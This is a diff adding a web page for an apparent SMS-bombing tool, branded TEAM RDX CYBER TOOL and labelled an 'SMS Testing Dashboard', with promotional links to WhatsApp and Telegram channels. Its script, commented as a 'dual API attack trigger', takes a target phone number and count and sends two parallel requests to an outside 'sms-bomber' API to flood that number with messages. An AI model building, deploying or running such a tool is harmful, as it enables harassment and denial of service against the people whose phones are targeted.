@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TEAM RDX CYBER TOOL· HEAVY NEOMORPHISM</title>
+    <style>
+        /* --- HEAVY WHITE NEOMORPHISM THEME --- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
+        }
+
+        body {
+            background-color: #e6eef8;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            position: relative;
+        }
+
+        /* main container with extra right margin for side panel */
+        .main-wrapper {
+            display: flex;
+            gap: 28px;
+            align-items: flex-start;
+            flex-wrap: wrap;
+            justify-content: center;
+            width: 100%;
+            max-width: 820px;
+        }
+
+        .container {
+            background: #e6eef8;
+            border-radius: 40px;
+            padding: 40px 30px;
+            width: 100%;
+            max-width: 440px;
+            box-shadow: 12px 12px 24px #b3c2d8, -12px -12px 24px #ffffff;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.7);
+            flex: 1 1 400px;
+        }
+
+        /* --- TELEGRAM SIDE PANEL (neomorphic) --- */
+        .telegram-side {
+            background: #e6eef8;
+            border-radius: 40px;
+            padding: 30px 20px;
+            min-width: 180px;
+            max-width: 210px;
+            box-shadow: 12px 12px 24px #b3c2d8, -12px -12px 24px #ffffff;
+            border: 1px solid rgba(255,255,255,0.7);
+            text-align: center;
+            flex: 0 0 auto;
+            align-self: stretch;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .telegram-side h4 {
+            font-size: 16px;
+            font-weight: 900;
+            color: #2d3748;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 10px;
+            text-shadow: 1px 1px 0 #ffffff;
+        }
+
+        .telegram-side p {
+            font-size: 13px;
+            font-weight: 600;
+            color: #4a5568;
+            margin-bottom: 22px;
+            line-height: 1.5;
+        }
+
+        .telegram-btn {
+            display: inline-block;
+            width: 100%;
+            padding: 14px 8px;
+            background: #e6eef8;
+            border-radius: 60px;
+            font-weight: 800;
+            font-size: 15px;
+            color: #1f3a6b;
+            text-decoration: none;
+            box-shadow: 6px 6px 12px #b3c2d8, -6px -6px 12px #ffffff;
+            transition: all 0.2s ease;
+            letter-spacing: 1px;
+            border: 1px solid rgba(255,255,255,0.6);
+        }
+
+        .telegram-btn:hover {
+            box-shadow: 8px 8px 16px #b3c2d8, -8px -8px 16px #ffffff;
+            color: #2b6cb0;
+            transform: scale(1.01);
+        }
+
+        .telegram-btn:active {
+            box-shadow: inset 4px 4px 8px #b3c2d8, inset -4px -4px 8px #ffffff;
+            transform: scale(0.96);
+        }
+
+        .telegram-icon {
+            font-size: 28px;
+            display: block;
+            margin-bottom: 6px;
+        }
+
+        .brand-title {
+            font-size: 28px;
+            font-weight: 900;
+            color: #2d3748;
+            letter-spacing: 2px;
+            margin-bottom: 4px;
+            text-transform: uppercase;
+            text-shadow: 2px 2px 0px #ffffff;
+        }
+
+        .subtitle {
+            font-size: 12px;
+            font-weight: 700;
+            color: #4a5568;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            margin-bottom: 30px;
+            background: linear-gradient(90deg, #4a5568, #718096);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        /* Deep Inset Inputs */
+        .input-field {
+            width: 100%;
+            padding: 18px;
+            background: #e6eef8;
+            border: none;
+            outline: none;
+            border-radius: 20px;
+            box-shadow: inset 6px 6px 12px #b3c2d8, inset -6px -6px 12px #ffffff;
+            font-size: 16px;
+            color: #2d3748;
+            font-weight: 700;
+            margin-bottom: 20px;
+            transition: all 0.3s ease;
+        }
+
+        .input-field:focus {
+            box-shadow: inset 8px 8px 16px #b3c2d8, inset -8px -8px 16px #ffffff;
+            color: #3182ce;
+        }
+
+        .count-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .count-btn {
+            padding: 14px 0;
+            font-size: 15px;
+            font-weight: 800;
+            border: none;
+            border-radius: 16px;
+            background: #e6eef8;
+            color: #4a5568;
+            box-shadow: 6px 6px 12px #b3c2d8, -6px -6px 12px #ffffff;
+            cursor: pointer;
+            transition: all 0.2s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        .count-btn:hover {
+            color: #3182ce;
+            transform: translateY(-2px);
+        }
+
+        .count-btn:active, .count-btn.active {
+            box-shadow: inset 4px 4px 8px #b3c2d8, inset -4px -4px 8px #ffffff;
+            color: #2b6cb0;
+            transform: translateY(0);
+        }
+
+        .action-btn {
+            width: 100%;
+            padding: 18px;
+            border: none;
+            border-radius: 20px;
+            font-size: 16px;
+            font-weight: 800;
+            color: #2b6cb0;
+            background: #e6eef8;
+            box-shadow: 8px 8px 16px #b3c2d8, -8px -8px 16px #ffffff;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .action-btn:hover {
+            color: #3182ce;
+            box-shadow: 10px 10px 20px #b3c2d8, -10px -10px 20px #ffffff;
+        }
+
+        .action-btn:active {
+            box-shadow: inset 5px 5px 10px #b3c2d8, inset -5px -5px 10px #ffffff;
+            transform: scale(0.99);
+        }
+
+        .log-box {
+            margin-top: 30px;
+            padding: 20px;
+            border-radius: 18px;
+            box-shadow: inset 4px 4px 10px #b3c2d8, inset -4px -4px 10px #ffffff;
+            font-size: 13px;
+            font-weight: 700;
+            color: #4a5568;
+            max-height: 160px;
+            overflow-y: auto;
+            display: none;
+            text-align: left;
+            line-height: 1.6;
+            background: rgba(230, 238, 248, 0.5);
+        }
+
+        .log-success { color: #2f855a; }
+        .log-info { color: #2b6cb0; }
+
+        /* --- POPUP OVERLAY (WHATSAPP CHANNEL) --- */
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(15, 23, 42, 0.3);
+            backdrop-filter: blur(6px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 1;
+            transition: opacity 0.3s ease;
+        }
+
+        .popup-card {
+            background: #e6eef8;
+            padding: 35px 30px;
+            border-radius: 30px;
+            width: 90%;
+            max-width: 380px;
+            text-align: center;
+            box-shadow: 15px 15px 30px rgba(0,0,0,0.1), -15px -15px 30px rgba(255,255,255,0.9);
+            border: 1px solid rgba(255,255,255,0.8);
+        }
+
+        .popup-card h3 {
+            color: #2c5282;
+            margin-bottom: 15px;
+            font-size: 22px;
+            font-weight: 800;
+        }
+
+        .popup-card p {
+            font-size: 14px;
+            color: #4a5568;
+            margin-bottom: 25px;
+            font-weight: 600;
+        }
+
+        .popup-join-btn {
+            display: inline-block;
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #25D366, #1ebd59);
+            color: #fff;
+            text-decoration: none;
+            font-weight: 700;
+            border-radius: 16px;
+            box-shadow: 0 5px 15px rgba(37, 211, 102, 0.4);
+            margin-bottom: 15px;
+            letter-spacing: 1px;
+        }
+
+        .popup-close-btn {
+            font-size: 13px;
+            color: #718096;
+            cursor: pointer;
+            text-decoration: underline;
+            font-weight: 700;
+        }
+
+        /* responsive */
+        @media (max-width: 700px) {
+            .main-wrapper {
+                flex-direction: column;
+                align-items: center;
+            }
+            .telegram-side {
+                max-width: 100%;
+                width: 100%;
+                flex-direction: row;
+                flex-wrap: wrap;
+                justify-content: center;
+                padding: 20px;
+                gap: 12px;
+            }
+            .telegram-side h4, .telegram-side p {
+                flex: 1 1 100%;
+                text-align: center;
+            }
+            .telegram-btn {
+                max-width: 260px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- 1️⃣ WHATSAPP CHANNEL POPUP (updated link) -->
+    <div class="popup-overlay" id="channelPopup">
+        <div class="popup-card">
+            <h3>📢 Join Official Channel</h3>
+            <p>TEAM RDX CYBER TECHX KE OFFICIAL METHOD OR TRICKS KILY FOLLOW KRLIY.</p>
+            <a href="https://whatsapp.com/channel/0029VbBd88qCXC3Qgt0Lzz0e" target="_blank" class="popup-join-btn" id="joinBtn">JOIN CHANNEL</a>
+            <div class="popup-close-btn" id="closePopupBtn">Skip & Proceed</div>
+        </div>
+    </div>
+
+    <!-- 2️⃣ MAIN LAYOUT: container + telegram side panel -->
+    <div class="main-wrapper">
+        <!-- Main Tool Card -->
+        <div class="container">
+            <h1 class="brand-title">TERDX CYBER TOOL</h1>
+            <p class="subtitle">SMS Testing Dashboard</p>
+
+            <input type="tel" id="targetNumber" class="input-field" placeholder="Enter Target Number (e.g. 923014646745)">
+
+            <input type="number" id="customCount" class="input-field" placeholder="Enter Custom Count" value="10">
+
+            <div class="count-grid">
+                <button class="count-btn" data-val="10">10</button>
+                <button class="count-btn" data-val="20">20</button>
+                <button class="count-btn" data-val="50">50</button>
+                <button class="count-btn" data-val="100">100</button>
+            </div>
+
+            <button class="action-btn" id="startBtn">Start Testing 🔥</button>
+
+            <div class="log-box" id="logBox"></div>
+        </div>
+
+        <!-- 3️⃣ TELEGRAM SIDE PANEL (always visible) -->
+        <div class="telegram-side">
+            <span class="telegram-icon">📡</span>
+            <h4>Telegram</h4>
+            <p>Join our Telegram channel for updates &amp; support</p>
+            <a href="https://t.me/RDXCYBER_TECHX" target="_blank" class="telegram-btn">
+                📲 Join Telegram channel
+            </a>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            // DOM Elements
+            const popup = document.getElementById('channelPopup');
+            const closePopupBtn = document.getElementById('closePopupBtn');
+            const joinBtn = document.getElementById('joinBtn');
+            const countButtons = document.querySelectorAll('.count-grid .count-btn');
+            const customCountInput = document.getElementById('customCount');
+            const targetNumberInput = document.getElementById('targetNumber');
+            const startBtn = document.getElementById('startBtn');
+            const logBox = document.getElementById('logBox');
+
+            // --- POPUP OVERLAY CLOSE (with transition) ---
+            function closePopup() {
+                popup.style.opacity = '0';
+                setTimeout(() => {
+                    popup.style.display = 'none';
+                }, 300);
+            }
+
+            closePopupBtn.addEventListener('click', closePopup);
+            joinBtn.addEventListener('click', () => {
+                // after opening link, popup will be hidden after 800ms
+                setTimeout(() => {
+                    popup.style.opacity = '0';
+                    setTimeout(() => {
+                        popup.style.display = 'none';
+                    }, 300);
+                }, 800);
+            });
+
+            // --- QUICK COUNT SELECTION ---
+            countButtons.forEach(btn => {
+                btn.addEventListener('click', () => {
+                    countButtons.forEach(b => b.classList.remove('active'));
+                    btn.classList.add('active');
+                    customCountInput.value = btn.getAttribute('data-val');
+                });
+            });
+
+            customCountInput.addEventListener('input', () => {
+                countButtons.forEach(b => b.classList.remove('active'));
+            });
+
+            // --- LOGGER FUNCTION ---
+            function addLog(text, type = '') {
+                logBox.style.display = 'block';
+                const logClass = type ? `class="${type}"` : '';
+                logBox.innerHTML += `<div ${logClass}>${text}</div>`;
+                logBox.scrollTop = logBox.scrollHeight;
+            }
+
+            // --- DUAL API ATTACK TRIGGER (FAST SPEED) ---
+            startBtn.addEventListener('click', async () => {
+                const phone = targetNumberInput.value.trim();
+                const totalCount = customCountInput.value.trim();
+
+                if (!phone) {
+                    alert("❌ Input target number first!");
+                    return;
+                }
+                if (!totalCount || totalCount <= 0) {
+                    alert("❌ Set a valid loop count!");
+                    return;
+                }
+
+                logBox.innerHTML = ''; 
+                addLog(`🚀 [RDX CYBER TOOL] Dual-Pipeline Speed Mode Active...`);
+                addLog(`📡 Target: ${phone} | Threads: 2x Parallel`, 'log-info');
+
+                const apiUrl = `https://huiyi67-sms-bomber.hf.space/api?msisdn=${phone}&count=${totalCount}`;
+
+                try {
+                    addLog(`⚡ Launching Request Thread #1 & Thread #2 simultaneously...`);
+                    
+                    const [req1, req2] = await Promise.all([
+                        fetch(apiUrl).then(res => res.json()),
+                        fetch(apiUrl).then(res => res.json())
+                    ]);
+
+                    // Thread 1 Response
+                    if (req1.Status === "success") {
+                        addLog(`🟢 Thread-1 Success: Sent ${req1.data?.requests_initiated || totalCount} packets.`, 'log-success');
+                    } else {
+                        addLog(`⚠️ Thread-1 failed or blocked.`);
+                    }
+
+                    // Thread 2 Response
+                    if (req2.Status === "success") {
+                        addLog(`🟢 Thread-2 Success: Sent ${req2.data?.requests_initiated || totalCount} packets.`, 'log-success');
+                    } else {
+                        addLog(`⚠️ Thread-2 failed or blocked.`);
+                    }
+                    
+                    addLog(`🏁 Execution finished successfully!`);
+
+                } catch (error) {
+                    addLog(`❌ Speed Pipeline Error or Network Interrupt.`);
+                    console.error(error);
+                }
+            });
+
+        })();
+    </script>
+</body>
+</html>
